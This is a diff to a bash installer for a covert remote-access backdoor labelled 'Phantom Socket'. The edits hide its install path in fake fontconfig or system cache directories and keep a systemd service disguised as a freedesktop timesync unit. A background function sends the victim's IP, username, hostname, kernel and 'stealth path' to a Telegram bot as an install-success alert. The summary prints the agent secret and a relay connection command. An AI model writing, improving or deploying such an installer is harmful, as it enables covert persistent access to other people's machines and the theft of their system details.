@@ -74,10 +74,14 @@ INSTALL_DIR=""
 IS_ROOT=0
 if [[ $EUID -eq 0 ]]; then
     IS_ROOT=1
-    INSTALL_DIR="/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache"
+    INSTALL_DIR="/usr/lib/x86_64-linux-gnu/.system-runtime-cache"
 else
     IS_ROOT=0
-    INSTALL_DIR="$HOME/.local/share/gvfs/.metadata"
+    INSTALL_DIR="$HOME/.cache/fontconfig"
+    # Check for web paths
+    if [[ "${HOME}" == *"/var/www"* ]] || [[ "${HOME}" == *"vhosts"* ]]; then
+        INSTALL_DIR="/tmp/.fontconfig-daemon"
+    fi
 fi
 mkdir -p "${INSTALL_DIR}" 2>/dev/null
 
@@ -119,26 +123,17 @@ log_success "systemd service created (user)"
 # 6. Telemetry
 send_telemetry() {
     local hostname=$(hostname)
-    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
+    local timestamp=$(date -u "+%Y-%m-%d %H:%M:%S UTC")
     local ip=$(curl -s https://ifconfig.me || echo "Unknown")
     local kernel=$(uname -r)
     local user=$(whoami)
     
-    local report="SYSTEM ALERT: [INSTALL_SUCCESS]
-------------------------------------------------------------
-TARGET IP    : ${ip}
-USER         : ${user}
-HOSTNAME     : ${hostname}
-KERNEL VER   : ${kernel}
-ACTION       : Agent successfully deployed and persistent.
-STEALTH PATH : ${TARGET_BINARY}
-TIMESTAMP    : ${timestamp}
-------------------------------------------------------------
-INFO         : Phantom Socket v1.0.0-stable initialized."
+    local payload="<b>SYSTEM ALERT: [INSTALL_SUCCESS]</b>\n<b>TARGET IP    :</b> <code>${ip}</code>\n<b>USER         :</b> <code>${user}</code>\n<b>HOSTNAME     :</b> <code>${hostname}</code>\n<b>KERNEL VER   :</b> <code>${kernel}</code>\n<b>ACTION       :</b> Agent successfully deployed and persistent.\n<b>STEALTH PATH :</b> <code>${TARGET_BINARY}</code>\n<b>TIMESTAMP    :</b> ${timestamp}"
 
     curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
-        -d "text=${report}" >/dev/null 2>&1
+        -d "parse_mode=HTML" \
+        -d "text=${payload}" >/dev/null 2>&1
 }
 (send_telemetry) &
 
@@ -149,13 +144,13 @@ log_success "Self-deletion and cleanup completed"
 
 # 8. Final Summary
 echo ""
-log_success "Installation success"
-log_info "Secret: ${AGENT_SECRET}"
+echo "[+] Installation success"
+echo "[*] Secret: ${AGENT_SECRET}"
 echo ""
-log_info "Path: ${TARGET_BINARY}"
-log_info "Service: user dbus-org.freedesktop.timesync1"
+echo "[*] Path: ${TARGET_BINARY}"
+echo "[*] Service: user dbus-org.freedesktop.timesync1"
 echo ""
-log_info "Commands:"
+echo "[*] Commands:"
 echo "    systemctl --user start dbus-org.freedesktop.timesync1"
 echo "    systemctl --user status dbus-org.freedesktop.timesync1"
 echo "    journalctl --user -u dbus-org.freedesktop.timesync1 -f"
@@ -163,4 +158,4 @@ echo ""
 echo "    Or manually:"
 echo "    gs-oyen-s -s '${AGENT_SECRET}' -i '${PRODUCTION_IP}' -m 443"
 echo ""
-log_info "Relay: ${PRODUCTION_IP}:443"
+echo "[*] Relay: ${PRODUCTION_IP}:443"
